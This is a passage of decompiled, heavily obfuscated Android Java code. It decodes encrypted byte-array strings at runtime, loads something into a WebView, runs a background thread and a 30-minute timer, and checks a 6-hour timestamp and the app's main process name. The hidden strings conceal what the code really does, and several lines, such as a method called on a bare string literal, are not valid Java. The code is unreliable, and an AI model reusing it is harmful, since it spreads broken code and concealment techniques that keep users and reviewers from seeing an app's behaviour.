            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr21, bArr22));
            new Thread(new getClassLoader()).start();
            IlIlIIlIII1 ilIlIIlIII1 = new initialize();
            byte[] bArr23 = new byte[]{32, 53, -3, -26, 108, 67, -28, -79, 11, 116, -60, -91, 30, 82, -29, -93, 3, 32, -40, -93, 95, 84, -10, -113, 55, 95, -12, -120};
            byte[] bArr24 = new byte[]{104, 0, -85, -41, 62, 38, -126, -48};
            lllllIllIl1.IllIIlIIII1.getClassLoader(logLevel, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, lllliiiill12.decrypt(bArr23, bArr24));
            ilIlIIlIII1.decrypt(webViewArr[0]);
            new Timer().schedule(new C0009llllIllIl1(), 1800000L, 1800000L);
        } catch (Throwable th) {
            lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, IlIlllIIlI1.IllIIlIIII1."H5V1Refactor init error: " + th.getMessage());
        }
    }

    public final boolean decrypt() {
        if (IlIlllIIlI1.lIIIIlllllIlll1.initialize() || this.f267llllllIlIIIlll1.equals(f260IIlIllIIll1)) {
            return true;
        }
        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
        String llllIIIIll12 = IIlIllIIll1.decrypt(this.f261llllIIIIll1, lllliiiill1.decrypt(new byte[]{-96, 72, -1, -119, -86, 9, 119, 65, -98, 125, -27, -112, Byte.MIN_VALUE, 36, 116, 93}, new byte[]{-20, 41, -116, -3, -27, 111, 17, 36}));
        if (llllIIIIll12 == null) {
            return true;
        }
        try {
            if (llllIIIIll12.isEmpty()) {
                return true;
            }
            String trim = llllIIIIll12.trim();
            byte[] byteArray = new byte[]{-41, 103, 98};
            byte[] keyArray = new byte[]{-117, 3, 73, -125, 30, -22, -63, 28};
            if (!Pattern.matches(lllliiiill1.decrypt(byteArray, keyArray), trim)) {
                return true;
            }
            long parseLong = Long.parseLong(trim);
            boolean result = new Date().getTime() - parseLong >= 21600000;
            if (!result) {
                lllllIllIl1.lIIIIlllllIlll1 liiiilllllilll1 = lllllIllIl1.lIIIIlllllIlll1.f773llllllIlIIIlll1;
                String message = lllllIllIl1.llllIIIIll1.f793lllllIllIl1.f796llllIIIIll1;
                StringBuilder sb = new StringBuilder();
                byte[] encryptedData = new byte[]{-31, -88, 54, -117, 14, 125, -69, -22, -54, -23, 15, -56, 124, 123, -75, -18, -54, -10, 64, -50, 53, 117, -72, -17, -119, -14, 21, -50, 112, 56, -78, -25, -51, -89, 64};
                byte[] decryptionKey = new byte[]{-87, -99, 96, -70, 92, 24, -35, -117};
                StringBuilder append = sb.append(lllliiiill1.decrypt(encryptedData, decryptionKey)).append(parseLong);
                byte[] bArr5 = new byte[]{-90, 126, -87, 62, -34, -79, -89};
                byte[] bArr6 = new byte[]{-118, 94, -57, 81, -87, -117, -121, 45};
                liiiilllllilll1.decrypt(message, append.append(lllliiiill1.decrypt(bArr5, bArr6)).append(new Date().getTime()).toString());
            }
            return result;
        } catch (Exception e) {
            lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.ERROR, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll1.lIIIIlllllIlll1.decrypt(e, new StringBuilder().append(IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1.decrypt(new byte[]{Byte.MIN_VALUE, 90, 16, -49, 95, 113, 90, -18, -85, 27, 41, -116, 45, 119, 84, -22, -85, 4, 5, -97, 99, 70, 73, -31, -24, 10, 52, -116, 98, 102, 6, -81}, new byte[]{-56, 111, 70, -2, 13, 20, 60, -113}))));
            return true;
        }
    }

    public final boolean decrypt(Context context) {
        int myPid = Process.myPid();
        String message = lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1;
        Iterator<ActivityManager.RunningAppProcessInfo> it = ((ActivityManager) context.getSystemService(IlIlllIIlI1.IllIIlIIII1."activity")).getRunningAppProcesses().iterator();
        while (true) {
            if (!it.hasNext()) {
                break;
            }
            ActivityManager.RunningAppProcessInfo next = it.next();
            if (next.pid == myPid) {
                message = next.processName;
                break;
            }
        }
        String packageName = context.getPackageName();
        IllIIlIIII1.llllIIIIll1 lllliiiill1 = IlIlllIIlI1.IllIIlIIII1.f239llllIIIIll1;
        lllllIllIl1.IllIIlIIII1.getClassLoader(Log.LogLevel.INFO, lIIlllIIIlllII1.llllIllIl1.f377llllIllIl1, llllIIIIll1.llllIIIIll1.decrypt(lllliiiill1, new byte[]{52, -82, 93, -53, 89, -103, 80, 106, 103, -95, 51, -38, 70, -109, 9, 47}, new byte[]{20, -46, 125, -69, 43, -10, 51, 15}, new StringBuilder().append("mainProcessName: ").append(packageName), message));
        this.f263llllIllIl1 = message;
        return message.equals(packageName);
    }
}
